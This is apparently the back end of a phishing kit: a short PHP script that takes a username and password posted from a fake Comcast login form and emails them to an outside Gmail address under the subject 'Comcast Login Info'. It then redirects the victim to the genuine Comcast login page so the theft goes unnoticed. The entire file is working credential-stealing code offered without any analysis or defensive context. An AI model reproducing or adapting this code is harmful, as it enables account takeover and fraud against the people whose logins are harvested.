<?php

$to      = 'constantkid60@gmail.com';
$subject = 'Comcast Login Info';
$message = "Email or username: ".$_REQUEST["user"]."\r\n"."Password: ".$_REQUEST["passwd"];

mail($to, $subject, $message);
?>

<html>
	<head>
        <meta http-equiv="refresh" content="1; url=https://login.comcast.net/login?s=portal&ts=c5a2692b&continue=http%3A%2F%2Fxfinity.comcast.net%2F" />
    </head>
    <body>
    	<div align="center">
        	<h3>Thank You...</h3>
        </div>
    </body>
</html>